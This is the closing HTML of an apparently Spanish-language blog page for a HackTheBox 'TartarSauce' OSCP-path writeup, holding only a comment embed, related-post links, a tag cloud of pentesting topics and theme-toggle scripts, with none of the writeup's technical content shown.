+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/08/02/TartarSauce.html';
+     this.page.identifier = '/2021/08/02/TartarSauce';
+     this.page.title = 'OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/06/27/Trick.html">
+            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/15/Attacktive-Directory.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Writeup de la maquina de HackTheBox llamada TTARTARSAUCE siguiendo el PATH para el OSCP';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
